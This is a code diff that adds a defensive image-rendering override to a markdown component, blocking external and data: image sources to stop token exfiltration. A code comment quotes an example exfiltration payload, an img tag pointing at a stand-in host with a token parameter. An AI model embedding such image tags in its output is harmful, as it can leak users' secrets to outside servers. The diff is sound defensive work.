@@ -85,6 +85,25 @@ export function useStreamdownComponents(contentId: string) {
           </details>
         )
       },
+      img(props: JSX.IntrinsicElements['img']) {
+        // Block external img src to prevent data-exfil via
+        // `<img src="https://exfil.test/?token=...">` embedded in
+        // markdown. Streamdown 2's default `allowedImagePrefixes: ['*']`
+        // would allow this, and the `urlTransform` prop doesn't apply
+        // to raw-HTML img tags (only markdown `![](url)` syntax).
+        // Doing the check at the React component level catches both.
+        const src = props.src
+        if (typeof src !== 'string' || src.length === 0) return null
+        if (src.startsWith('/')) return <img {...props} />
+        if (src.startsWith('data:')) return null
+        try {
+          const u = new URL(src, window.location.origin)
+          if (u.origin === window.location.origin) return <img {...props} />
+        } catch {
+          /* malformed */
+        }
+        return null
+      },
       li(props: JSX.IntrinsicElements['li']) {
         const { id, className, ...rest } = props
         // Scope footnote definition IDs to avoid cross-message duplicates
